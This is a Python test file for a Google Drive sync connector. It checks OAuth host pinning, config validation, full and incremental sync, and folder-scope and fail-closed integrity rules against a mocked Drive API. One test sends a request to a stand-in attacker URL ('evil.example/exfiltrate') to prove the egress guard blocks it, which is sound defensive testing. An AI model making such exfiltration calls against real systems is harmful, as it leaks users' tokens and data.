"""Google Drive connector tests — offline, MockTransport-backed (#453).

Drives the REAL guarded client (``build_authenticated_client``) against a fake
Drive REST server behind an ``httpx.MockTransport``: the shared egress
primitive is stubbed with a public-range answer + a passthrough pin (exactly
like ``test_authenticated_client_is_host_pinned``), so every test exercises the
guard ORDER without a socket. Covers ADR-0019 §3/§5:

* config validation (closed mode variants, INV-8);
* the pinned OAuth spec (hosts, scope, offline-consent params);
* full sync: start-token-**before**-enumeration, content mapping (Docs/Sheets
  exports, binary pass-through, oversize + unsupported skips), scope chains,
  drive-scoped tokens for Shared Drives, ACL-fetch failure ⇒ skip;
* incremental: page shape (upserts/deletions/stale scopes/integrity), the
  terminal ``newStartPageToken`` baseline, HTTP 410 ⇒ typed cursor-expired,
  429/Retry-After backoff;
* the pinned-host guard (a foreign-host request never dials).
"""

from __future__ import annotations

import uuid
from collections.abc import AsyncIterator
from datetime import UTC, datetime
from typing import Any
from urllib.parse import parse_qs

import httpx
import pytest

import app.net.egress as net_egress
from app.connectors.base import (
    AclMappingContext,
    ConnectorConfigError,
    CursorExpiredError,
    FullSyncResult,
    PageIntegrity,
    SyncPage,
)
from app.connectors.gdrive import CONNECTOR, GdriveConnector
from app.connectors.gdrive import api as gdrive_api
from app.connectors.gdrive.connector import _MAX_ANCESTOR_DEPTH
from app.connectors.oauth import EgressNotAllowedError, build_authenticated_client
from app.connectors.registry import registered_types
from app.domain.entities import Source, SourceStatus

_FOLDER = "application/vnd.google-apps.folder"
_GDOC = "application/vnd.google-apps.document"
_GSHEET = "application/vnd.google-apps.spreadsheet"

_ALICE_ID = uuid.uuid4()
_CTX = AclMappingContext(
    email_to_user_id={"alice@acme.test": _ALICE_ID},
    evaluated_at=datetime(2026, 7, 18, tzinfo=UTC),
)

_READER_ALICE = [{"type": "user", "role": "reader", "emailAddress": "alice@acme.test"}]


def _source(config: dict[str, object]) -> Source:
    now = datetime.now(UTC)
    return Source(
        id=uuid.uuid4(),
        tenant_id=uuid.uuid4(),
        owner_id=uuid.uuid4(),
        type="gdrive",
        config=config,
        status=SourceStatus.PENDING,
        indexed_count=0,
        last_synced_at=None,
        last_error=None,
        created_at=now,
        updated_at=now,
    )


class FakeDrive:
    """A scriptable Drive REST v3 double served through MockTransport."""

    def __init__(self) -> None:
        self.files: dict[str, dict[str, Any]] = {}
        self.children: dict[str, list[str]] = {}  # folder id -> child file ids
        self.permissions: dict[str, list[dict[str, Any]]] = {}
        self.perm_fail_ids: set[str] = set()
        self.exports: dict[str, bytes] = {}
        self.media: dict[str, bytes] = {}
        self.start_token = "start-token-1"
        self.changes_pages: dict[str, dict[str, Any]] = {}
        self.fail_children_of: set[str] = set()
        self.fail_get_ids: set[str] = set()  # files.get returns 500 for these
        self.rate_limit_next: int = 0  # serve N 429s before succeeding
        self.calls: list[str] = []  # ordered request paths (with intent tags)
        # Chunked (streamed) media bodies + how many chunks were actually
        # produced — the proof that an over-cap read stops early.
        self.stream_media: dict[str, list[bytes]] = {}
        self.stream_content_length: dict[str, str] = {}
        self.served_chunks: list[str] = []

    def _streamed(self, file_id: str) -> httpx.Response:
        chunks = self.stream_media[file_id]
        served = self.served_chunks

        async def _body() -> AsyncIterator[bytes]:
            for chunk in chunks:
                served.append(file_id)
                yield chunk

        headers = {}
        declared = self.stream_content_length.get(file_id)
        if declared is not None:
            headers["Content-Length"] = declared
        return httpx.Response(200, content=_body(), headers=headers)

    def add_file(
        self,
        file_id: str,
        *,
        name: str = "f",
        mime: str = _GDOC,
        parents: list[str] | None = None,
        drive_id: str | None = None,
        size: str | None = None,
        inherited_disabled: bool = False,
        permissions: list[dict[str, Any]] | None = None,
        export: bytes = b"exported text",
        media: bytes = b"",
    ) -> None:
        meta: dict[str, Any] = {
            "id": file_id,
            "name": name,
            "mimeType": mime,
            "modifiedTime": "2026-07-18T10:00:00Z",
        }
        if parents:
            meta["parents"] = parents
            for parent in parents:
                self.children.setdefault(parent, []).append(file_id)
        if drive_id:
            meta["driveId"] = drive_id
        if size is not None:
            meta["size"] = size
        if inherited_disabled:
            meta["inheritedPermissionsDisabled"] = True
        self.files[file_id] = meta
        self.permissions[file_id] = permissions if permissions is not None else list(_READER_ALICE)
        self.exports[file_id] = export
        self.media[file_id] = media

    # --- the transport handler ------------------------------------------------

    def handler(self, request: httpx.Request) -> httpx.Response:
        assert request.url.host == "www.googleapis.com"
        path = request.url.path
        params = {k: v[0] for k, v in parse_qs(request.url.query.decode("ascii")).items()}
        if self.rate_limit_next > 0:
            self.rate_limit_next -= 1
            return httpx.Response(429, headers={"Retry-After": "2"})
        if path == "/drive/v3/changes/startPageToken":
            self.calls.append(f"startPageToken drive={params.get('driveId')}")
            return httpx.Response(200, json={"startPageToken": self.start_token})
        if path == "/drive/v3/changes":
            token = params.get("pageToken", "")
            self.calls.append(f"changes token={token} drive={params.get('driveId')}")
            payload = self.changes_pages.get(token)
            if payload is None:
                return httpx.Response(410)
            return httpx.Response(200, json=payload)
        if path == "/drive/v3/about":
            self.calls.append("about")
            return httpx.Response(200, json={"user": {"emailAddress": "alice@acme.test"}})
        if path == "/drive/v3/files":
            query = params.get("q", "")
            self.calls.append(f"files.list q={query}")
            if "' in parents" in query:
                folder_id = query.split("'")[1]
                if folder_id in self.fail_children_of:
                    return httpx.Response(500)
                ids = self.children.get(folder_id, [])
                return httpx.Response(
                    200, json={"files": [self.files[i] for i in ids if i in self.files]}
                )
            return httpx.Response(200, json={"files": list(self.files.values())})
        if path.endswith("/permissions"):
            file_id = path.split("/")[-2]
            self.calls.append(f"permissions {file_id}")
            if file_id in self.perm_fail_ids:
                return httpx.Response(500)
            return httpx.Response(200, json={"permissions": self.permissions.get(file_id, [])})
        if path.endswith("/export"):
            file_id = path.split("/")[-2]
            self.calls.append(f"export {file_id} mime={params.get('mimeType')}")
            if file_id in self.stream_media:
                return self._streamed(file_id)
            return httpx.Response(200, content=self.exports.get(file_id, b""))
        if path.startswith("/drive/v3/files/"):
            file_id = path.split("/")[-1]
            if params.get("alt") == "media":
                self.calls.append(f"download {file_id}")
                if file_id in self.stream_media:
                    return self._streamed(file_id)
                return httpx.Response(200, content=self.media.get(file_id, b""))
            self.calls.append(f"files.get {file_id}")
            if file_id in self.fail_get_ids:
                return httpx.Response(500)
            meta = self.files.get(file_id)
            if meta is None:
                return httpx.Response(404)
            return httpx.Response(200, json=meta)
        raise AssertionError(f"unexpected Drive path: {path}")


@pytest.fixture
def fake_drive() -> FakeDrive:
    return FakeDrive()


@pytest.fixture
def guard_stub(monkeypatch: pytest.MonkeyPatch) -> None:
    """Public-range resolve + passthrough pin so the REAL guard runs offline."""
    monkeypatch.setattr(net_egress, "resolve_safe_ip", lambda host: "142.250.4.95")
    monkeypatch.setattr(net_egress, "pin_url_to_ip", lambda url, ip: url)


def _client(fake: FakeDrive) -> httpx.AsyncClient:
    return build_authenticated_client(
        GdriveConnector().oauth_spec(),
        access_token="tok",
        timeout=5.0,
        inner_transport=httpx.MockTransport(fake.handler),
    )


class _Run:
    """A minimal ConnectorRun stand-in (frozen dataclass shape not required)."""

    def __init__(self, http: httpx.AsyncClient, ctx: AclMappingContext | None = _CTX) -> None:
        self.http = http
        self.acl_context = ctx


async def _drain(pages: AsyncIterator[SyncPage]) -> list[SyncPage]:
    return [page async for page in pages]


# --- discovery + config -------------------------------------------------------


def test_registry_discovers_gdrive() -> None:
    assert "gdrive" in registered_types()


def test_validate_config_closed_variants() -> None:
    c = GdriveConnector()
    assert c.validate_config({"mode": "my_drive"}) == {"mode": "my_drive"}
    assert c.validate_config({"mode": "folder", "folder_id": "f1"}) == {
        "mode": "folder",
        "folder_id": "f1",
    }
    assert c.validate_config({"mode": "folder", "folder_id": "f1", "drive_id": "d1"}) == {
        "mode": "folder",
        "folder_id": "f1",
        "drive_id": "d1",
    }
    assert c.validate_config({"mode": "shared_drive", "drive_id": "d1"}) == {
        "mode": "shared_drive",
        "drive_id": "d1",
    }


@pytest.mark.parametrize(
    "config",
    [
        {"mode": "nope"},
        {},
        {"mode": "my_drive", "folder_id": "f1"},
        {"mode": "my_drive", "drive_id": "d1"},
        {"mode": "folder"},
        {"mode": "folder", "folder_id": ""},
        {"mode": "shared_drive"},
        {"mode": "shared_drive", "drive_id": ""},
        {"mode": "shared_drive", "drive_id": "d1", "folder_id": "f1"},
    ],
)
def test_validate_config_rejections(config: dict[str, object]) -> None:
    with pytest.raises(ConnectorConfigError) as exc:
        GdriveConnector().validate_config(config)
    assert exc.value.code == "invalid_config"


def test_oauth_spec_is_pinned_to_google() -> None:
    from app.core.config import get_settings

    spec = CONNECTOR.oauth_spec()
    assert spec.authorize_url == "https://accounts.google.com/o/oauth2/v2/auth"
    assert spec.token_url == "https://oauth2.googleapis.com/token"
    assert spec.scopes == ("https://www.googleapis.com/auth/drive.readonly",)
    assert spec.allowed_hosts == (
        "accounts.google.com",
        "oauth2.googleapis.com",
        "www.googleapis.com",
    )
    assert spec.extra_authorize_params == {"access_type": "offline", "prompt": "consent"}
    assert spec.client_id == get_settings().gdrive_oauth_client_id
    assert spec.client_secret == get_settings().gdrive_oauth_client_secret


# --- the pinned-host guard ----------------------------------------------------


async def test_foreign_host_request_is_refused_before_dial(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """ADR-0009 §3 bar: a request leaving the pinned host set is a defect —
    the guard refuses it before any bytes (or the bearer) leave."""
    async with _client(fake_drive) as http:
        with pytest.raises(EgressNotAllowedError):
            await http.get("https://evil.example/exfiltrate")
    assert fake_drive.calls == []  # nothing ever dialled


async def test_fetch_account_email_uses_about_get(guard_stub: None, fake_drive: FakeDrive) -> None:
    async with _client(fake_drive) as http:
        email = await CONNECTOR.fetch_account_email(http)
    assert email == "alice@acme.test"


# --- full sync ----------------------------------------------------------------


async def test_full_sync_captures_start_token_before_enumeration(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    fake_drive.add_file("doc1", name="Doc One", mime=_GDOC, export=b"hello world")
    async with _client(fake_drive) as http:
        result = await CONNECTOR.sync(_source({"mode": "my_drive"}), _Run(http))  # type: ignore[arg-type]
    assert isinstance(result, FullSyncResult)
    assert result.baseline_cursor == "start-token-1"
    first_list = next(i for i, c in enumerate(fake_drive.calls) if c.startswith("files.list"))
    token_call = next(i for i, c in enumerate(fake_drive.calls) if c.startswith("startPageToken"))
    assert token_call < first_list, "the start token must be captured BEFORE enumeration"


async def test_full_sync_content_mapping_and_skips(guard_stub: None, fake_drive: FakeDrive) -> None:
    fake_drive.add_file("doc1", name="Doc", mime=_GDOC, export=b"doc text")
    fake_drive.add_file("sheet1", name="Sheet", mime=_GSHEET, export=b"a,b\n1,2\n")
    fake_drive.add_file(
        "pdf1", name="Deck.pdf", mime="application/pdf", size="10", media=b"%PDF-1.7 x"
    )
    fake_drive.add_file("big1", name="Huge.pdf", mime="application/pdf", size="999999999999")
    fake_drive.add_file("img1", name="Pic.png", mime="image/png")
    async with _client(fake_drive) as http:
        result = await CONNECTOR.sync(_source({"mode": "my_drive"}), _Run(http))  # type: ignore[arg-type]
    assert isinstance(result, FullSyncResult)
    by_id = {d.external_id: d for d in result.docs}
    assert set(by_id) == {"doc1", "sheet1", "pdf1"}
    assert by_id["doc1"].text == "doc text" and by_id["doc1"].data is None
    assert by_id["doc1"].mime_type == "text/plain"
    assert by_id["sheet1"].text == "a,b\n1,2\n"  # CSV flatten, carried as text
    assert by_id["pdf1"].data == b"%PDF-1.7 x"
    assert by_id["pdf1"].mime_type == "application/pdf"
    # Oversize + unsupported are skipped AND counted (sync health).
    assert result.skipped_count == 2
    # Sheets exported as CSV (the requested export mime).
    assert any("export sheet1 mime=text/csv" in c for c in fake_drive.calls)
    # Every emitted doc carries the mapped mirror.
    for doc in result.docs:
        assert doc.acl is not None
        assert doc.acl.principals == frozenset({f"user:{_ALICE_ID}"})


async def test_full_sync_scope_chain_carries_drive_and_ancestors(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    fake_drive.add_file("root", name="Root", mime=_FOLDER, drive_id="drv1")
    fake_drive.add_file("sub", name="Sub", mime=_FOLDER, parents=["root"], drive_id="drv1")
    fake_drive.add_file(
        "doc1", name="Deep", mime=_GDOC, parents=["sub"], drive_id="drv1", export=b"x"
    )
    async with _client(fake_drive) as http:
        result = await CONNECTOR.sync(
            _source({"mode": "shared_drive", "drive_id": "drv1"}),
            _Run(http),  # type: ignore[arg-type]
        )
    assert isinstance(result, FullSyncResult)
    [doc] = list(result.docs)
    assert doc.acl is not None
    assert doc.acl.scope_ids == frozenset({"drv1", "sub", "root"})
    # Shared-drive mode: the start token is DRIVE-scoped (ADR-0019 §3).
    assert any(c == "startPageToken drive=drv1" for c in fake_drive.calls)


async def test_full_sync_acl_fetch_failure_skips_document(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """A permissions fetch that keeps failing ⇒ the document is skipped this
    sync (never ingested with unknown rights) and counted."""
    fake_drive.add_file("doc1", name="Ok", mime=_GDOC, export=b"x")
    fake_drive.add_file("doc2", name="Broken", mime=_GDOC, export=b"y")
    fake_drive.perm_fail_ids.add("doc2")
    async with _client(fake_drive) as http:
        result = await CONNECTOR.sync(_source({"mode": "my_drive"}), _Run(http))  # type: ignore[arg-type]
    assert isinstance(result, FullSyncResult)
    assert [d.external_id for d in result.docs] == ["doc1"]
    assert result.skipped_count == 1


async def test_folder_mode_enumerates_subtree_only(guard_stub: None, fake_drive: FakeDrive) -> None:
    fake_drive.add_file("watch", name="Watched", mime=_FOLDER, parents=["above"])
    fake_drive.files["above"] = {"id": "above", "name": "Above", "mimeType": _FOLDER}
    fake_drive.add_file("in1", name="Inside", mime=_GDOC, parents=["watch"], export=b"x")
    fake_drive.add_file("out1", name="Outside", mime=_GDOC, parents=["above"], export=b"y")
    async with _client(fake_drive) as http:
        result = await CONNECTOR.sync(
            _source({"mode": "folder", "folder_id": "watch"}),
            _Run(http),  # type: ignore[arg-type]
        )
    assert isinstance(result, FullSyncResult)
    assert [d.external_id for d in result.docs] == ["in1"]
    [doc] = list(result.docs)
    assert doc.acl is not None
    # The chain watches the sync root AND its upward ancestors.
    assert {"watch", "above"} <= set(doc.acl.scope_ids)


# --- incremental sync ---------------------------------------------------------


async def test_fetch_changes_pages_deletions_and_upserts(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    fake_drive.add_file("doc1", name="Changed", mime=_GDOC, export=b"new text")
    fake_drive.changes_pages = {
        "cur-1": {
            "changes": [
                {"changeType": "file", "fileId": "gone1", "removed": True},
                {"changeType": "file", "fileId": "doc1", "file": fake_drive.files["doc1"]},
            ],
            "nextPageToken": "cur-2",
        },
        "cur-2": {
            "changes": [
                {
                    "changeType": "file",
                    "fileId": "trash1",
                    "file": {"id": "trash1", "mimeType": _GDOC, "trashed": True},
                },
            ],
            "newStartPageToken": "baseline-9",
        },
    }
    async with _client(fake_drive) as http:
        pages = await _drain(
            CONNECTOR.fetch_changes(_source({"mode": "my_drive"}), "cur-1", _Run(http))  # type: ignore[arg-type]
        )
    assert len(pages) == 2
    first, last = pages
    assert first.deleted_external_ids == frozenset({"gone1"})
    assert [d.external_id for d in first.upserts] == ["doc1"]
    assert first.next_cursor == "cur-2"  # per-page resume point
    assert first.integrity is PageIntegrity.COMPLETE
    assert last.deleted_external_ids == frozenset({"trash1"})
    assert last.next_cursor == "baseline-9"  # the drained replay's new baseline


async def test_fetch_changes_folder_change_yields_stale_scope_and_reexamines(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    fake_drive.add_file("fold1", name="Folder", mime=_FOLDER)
    fake_drive.add_file("child1", name="Child", mime=_GDOC, parents=["fold1"], export=b"c")
    fake_drive.changes_pages = {
        "cur-1": {
            "changes": [
                {"changeType": "file", "fileId": "fold1", "file": fake_drive.files["fold1"]},
            ],
            "newStartPageToken": "baseline-2",
        }
    }
    async with _client(fake_drive) as http:
        pages = await _drain(
            CONNECTOR.fetch_changes(_source({"mode": "my_drive"}), "cur-1", _Run(http))  # type: ignore[arg-type]
        )
    [page] = pages
    assert page.stale_scope_ids == frozenset({"fold1"})
    assert page.integrity is PageIntegrity.COMPLETE
    # The run re-examines the container's descendants in the same page.
    assert [d.external_id for d in page.upserts] == ["child1"]


async def test_fetch_changes_drive_change_scopes_by_drive_id(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    fake_drive.changes_pages = {
        "cur-1": {
            "changes": [{"changeType": "drive", "driveId": "drv1"}],
            "newStartPageToken": "baseline-3",
        }
    }
    async with _client(fake_drive) as http:
        pages = await _drain(
            CONNECTOR.fetch_changes(
                _source({"mode": "shared_drive", "drive_id": "drv1"}),
                "cur-1",
                _Run(http),  # type: ignore[arg-type]
            )
        )
    [page] = pages
    assert "drv1" in page.stale_scope_ids
    # Drive-scoped change log (ADR-0019 §3): the token request carries driveId.
    assert any(c.startswith("changes token=cur-1 drive=drv1") for c in fake_drive.calls)


async def test_fetch_changes_unprovable_effects_mark_incomplete(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """A live change without file metadata cannot prove its cascade effects —
    the page fails closed with integrity=incomplete."""
    fake_drive.changes_pages = {
        "cur-1": {
            "changes": [{"changeType": "file", "fileId": "mystery1"}],
            "newStartPageToken": "baseline-4",
        }
    }
    async with _client(fake_drive) as http:
        pages = await _drain(
            CONNECTOR.fetch_changes(_source({"mode": "my_drive"}), "cur-1", _Run(http))  # type: ignore[arg-type]
        )
    [page] = pages
    assert page.integrity is PageIntegrity.INCOMPLETE


async def test_fetch_changes_enumeration_failure_marks_incomplete(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """Descendant enumeration failing mid-cascade ⇒ the affected set is
    unprovable ⇒ integrity=incomplete (source-wide stamp downstream)."""
    fake_drive.add_file("fold1", name="Folder", mime=_FOLDER)
    fake_drive.fail_children_of.add("fold1")
    fake_drive.changes_pages = {
        "cur-1": {
            "changes": [
                {"changeType": "file", "fileId": "fold1", "file": fake_drive.files["fold1"]},
            ],
            "newStartPageToken": "baseline-5",
        }
    }
    async with _client(fake_drive) as http:
        pages = await _drain(
            CONNECTOR.fetch_changes(_source({"mode": "my_drive"}), "cur-1", _Run(http))  # type: ignore[arg-type]
        )
    [page] = pages
    assert page.stale_scope_ids == frozenset({"fold1"})
    assert page.integrity is PageIntegrity.INCOMPLETE


async def test_fetch_changes_410_raises_typed_cursor_expired(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    async with _client(fake_drive) as http:
        with pytest.raises(CursorExpiredError):
            await _drain(
                CONNECTOR.fetch_changes(
                    _source({"mode": "my_drive"}),
                    "unknown-cursor",
                    _Run(http),  # type: ignore[arg-type]
                )
            )


# --- folder mode: the change log is WIDER than the configured subtree --------


def _folder_tree(fake: FakeDrive) -> None:
    """``above`` ⊃ {``watch`` (the sync root) ⊃ ``sub``, ``elsewhere``}."""
    fake.files["above"] = {"id": "above", "name": "Above", "mimeType": _FOLDER}
    fake.add_file("watch", name="Watched", mime=_FOLDER, parents=["above"])
    fake.add_file("sub", name="Sub", mime=_FOLDER, parents=["watch"])
    fake.add_file("elsewhere", name="Elsewhere", mime=_FOLDER, parents=["above"])


def _change(fake: FakeDrive, *file_ids: str, next_token: str = "baseline-x") -> None:
    fake.changes_pages = {
        "cur-1": {
            "changes": [
                {"changeType": "file", "fileId": fid, "file": fake.files[fid]} for fid in file_ids
            ],
            "newStartPageToken": next_token,
        }
    }


def _folder_source() -> Source:
    return _source({"mode": "folder", "folder_id": "watch"})


async def test_change_inside_the_subtree_is_ingested(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    _folder_tree(fake_drive)
    fake_drive.add_file("in1", name="Inside", mime=_GDOC, parents=["sub"], export=b"x")
    _change(fake_drive, "in1")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert [d.external_id for d in page.upserts] == ["in1"]
    assert page.deleted_external_ids == frozenset()


async def test_change_outside_the_subtree_is_never_imported(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """Regression (ADR-0019 §5): folder mode consumed the WHOLE user/Shared-Drive
    change log and upserted any live ingestible file.

    Drive's changes feed is per-account, not per-folder, so a change anywhere
    in My Drive imported data the source was never configured to ingest. Every
    live change must now prove its *current* ancestor chain contains the
    configured ``folder_id``.
    """
    _folder_tree(fake_drive)
    fake_drive.add_file("out1", name="Outside", mime=_GDOC, parents=["elsewhere"], export=b"y")
    _change(fake_drive, "out1")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.upserts == ()
    # Reconciled as a deletion — a no-op when no row exists for it, and the
    # correct repair when the row IS ours (see the move-out test below).
    assert page.deleted_external_ids == frozenset({"out1"})
    assert page.integrity is PageIntegrity.COMPLETE
    # Never even fetched: no content, no permissions leave the pinned host set.
    assert not any(c.startswith("export out1") for c in fake_drive.calls)
    assert not any(c.startswith("permissions out1") for c in fake_drive.calls)


async def test_file_moved_out_of_the_subtree_is_removed(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """A file that moves OUT is reconciled as a deletion, not left orphaned."""
    _folder_tree(fake_drive)
    fake_drive.add_file("moved", name="Moved", mime=_GDOC, parents=["elsewhere"], export=b"z")
    _change(fake_drive, "moved")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.upserts == ()
    assert page.deleted_external_ids == frozenset({"moved"})


async def test_file_moved_into_the_subtree_is_ingested(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    _folder_tree(fake_drive)
    fake_drive.add_file("arrived", name="Arrived", mime=_GDOC, parents=["watch"], export=b"w")
    _change(fake_drive, "arrived")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert [d.external_id for d in page.upserts] == ["arrived"]


async def test_ancestor_change_reexamines_the_configured_root_only(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """A permission change ABOVE the sync root cascades over everything we
    sync — but re-examination enumerates the configured root, never the
    ancestor's own subtree (which holds siblings outside the source)."""
    _folder_tree(fake_drive)
    fake_drive.add_file("in1", name="Inside", mime=_GDOC, parents=["sub"], export=b"x")
    fake_drive.add_file("out1", name="Outside", mime=_GDOC, parents=["elsewhere"], export=b"y")
    _change(fake_drive, "above")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.stale_scope_ids == frozenset({"above"})  # descendants denied now
    assert [d.external_id for d in page.upserts] == ["in1"]  # only ours refreshed
    # The ancestor's own children are never enumerated.
    assert not any("q='above' in parents" in c for c in fake_drive.calls)


async def test_unrelated_container_change_is_ignored(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """A folder change outside the configured subtree cascades over nothing of
    ours — no stale scope, no re-enumeration."""
    _folder_tree(fake_drive)
    fake_drive.add_file("out1", name="Outside", mime=_GDOC, parents=["elsewhere"], export=b"y")
    _change(fake_drive, "elsewhere")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.stale_scope_ids == frozenset()
    assert page.upserts == ()
    assert page.integrity is PageIntegrity.COMPLETE
    assert not any("q='elsewhere' in parents" in c for c in fake_drive.calls)


async def test_inside_container_change_reexamines_that_folder(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """A folder change INSIDE the subtree re-examines that folder's descendants
    (the narrower, cheaper set) — not the whole configured root."""
    _folder_tree(fake_drive)
    fake_drive.add_file("deep", name="Deep", mime=_GDOC, parents=["sub"], export=b"d")
    fake_drive.add_file("shallow", name="Shallow", mime=_GDOC, parents=["watch"], export=b"s")
    _change(fake_drive, "sub")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.stale_scope_ids == frozenset({"sub"})
    assert [d.external_id for d in page.upserts] == ["deep"]


async def test_changed_file_that_stops_being_ingestible_is_removed(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """An in-subtree file whose type is no longer one we mirror is reconciled
    as a deletion — not silently left behind as un-refreshable content."""
    _folder_tree(fake_drive)
    fake_drive.add_file("pic", name="Pic.png", mime="image/png", parents=["watch"])
    _change(fake_drive, "pic")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.deleted_external_ids == frozenset({"pic"})
    assert page.integrity is PageIntegrity.COMPLETE


async def test_changed_file_with_unreadable_acl_marks_incomplete(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """Unknown rights on an ingestible file is NOT a deletion — it is the
    unprovable-mirror signal (fail closed source-wide downstream)."""
    _folder_tree(fake_drive)
    fake_drive.add_file("broken", name="Broken", mime=_GDOC, parents=["watch"], export=b"b")
    fake_drive.perm_fail_ids.add("broken")
    _change(fake_drive, "broken")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.upserts == ()
    assert page.deleted_external_ids == frozenset()  # never a deletion
    assert page.integrity is PageIntegrity.INCOMPLETE


async def test_unprovable_container_ancestry_fails_the_page_closed(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """Regression (fail-open): an ancestor lookup failure used to read as
    "outside".

    ``_parent_of`` turned every ``files.get`` ``ConnectorError`` into "no
    parent", so ``_container_relation`` labelled an *unprovable* folder
    ``outside`` and the replay silently dropped its permission cascade while
    still reporting ``integrity=complete`` — the framework then advanced the
    cursor with the folder's descendants' mirrors still fresh. Unknown is now
    distinct from a proven outside, and the page fails closed: the framework's
    INCOMPLETE handling stamps every mirrored document of the source stale and
    HOLDS the cursor (pinned in tests/test_gdrive_sync_task.py).
    """
    _folder_tree(fake_drive)
    fake_drive.add_file("in1", name="Inside", mime=_GDOC, parents=["sub"], export=b"x")
    fake_drive.add_file("mystery", name="Mystery", mime=_FOLDER, parents=["unknown-parent"])
    fake_drive.fail_get_ids.add("mystery")  # ancestry cannot be walked
    _change(fake_drive, "mystery")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.integrity is PageIntegrity.INCOMPLETE  # never silently ignored
    assert page.upserts == ()
    assert page.deleted_external_ids == frozenset()


async def test_unprovable_file_ancestry_is_neither_imported_nor_deleted(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """A changed FILE whose position cannot be walked is equally unprovable:
    importing could pull in out-of-scope content and "reconcile as deleted"
    could destroy a legitimate row, so the page fails closed instead."""
    _folder_tree(fake_drive)
    fake_drive.add_file("orphan", name="Orphan", mime=_GDOC, parents=["ghost"], export=b"o")
    fake_drive.fail_get_ids.add("ghost")
    _change(fake_drive, "orphan")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.integrity is PageIntegrity.INCOMPLETE
    assert page.upserts == ()
    assert page.deleted_external_ids == frozenset()  # never a guessed deletion


async def test_cyclic_container_ancestry_fails_the_page_closed(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """A parent CYCLE is unprovable, not "outside".

    The walk used to stop on revisiting an id and return the truncated chain,
    which ``_container_relation`` then read as a proven outside-scope
    container — the same fail-open as a lookup error, reached without one.
    A chain that never terminates cannot prove anything, so the page fails
    closed.
    """
    _folder_tree(fake_drive)
    fake_drive.add_file("loopA", name="Loop A", mime=_FOLDER, parents=["loopB"])
    fake_drive.add_file("loopB", name="Loop B", mime=_FOLDER, parents=["loopA"])
    _change(fake_drive, "loopA")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.integrity is PageIntegrity.INCOMPLETE
    assert page.upserts == ()
    assert page.deleted_external_ids == frozenset()


async def test_over_deep_container_ancestry_fails_the_page_closed(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """A chain longer than the walk cap is truncated — and a truncated chain is
    unprovable, not proof of "outside".

    Depth exhaustion previously returned normally, so a container nested deeper
    than ``_MAX_ANCESTOR_DEPTH`` below the configured root looked outside-scope
    and its cascade was dropped while the page still claimed COMPLETE.
    """
    _folder_tree(fake_drive)
    # A chain of folders far deeper than the cap, whose far end is genuinely
    # inside the configured root: only an untruncated walk could prove that.
    parent = "sub"
    for level in range(_MAX_ANCESTOR_DEPTH + 2):
        node = f"deep{level}"
        fake_drive.add_file(node, name=f"Deep {level}", mime=_FOLDER, parents=[parent])
        parent = node
    _change(fake_drive, parent)
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.integrity is PageIntegrity.INCOMPLETE
    assert page.upserts == ()


async def test_provably_outside_container_is_still_ignored(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """The fail-closed path must not swallow the *provable* case: a container
    whose ancestry reads cleanly and does not contain the root stays ignored,
    and the page stays complete."""
    _folder_tree(fake_drive)
    _change(fake_drive, "elsewhere")
    async with _client(fake_drive) as http:
        [page] = await _drain(CONNECTOR.fetch_changes(_folder_source(), "cur-1", _Run(http)))  # type: ignore[arg-type]
    assert page.integrity is PageIntegrity.COMPLETE
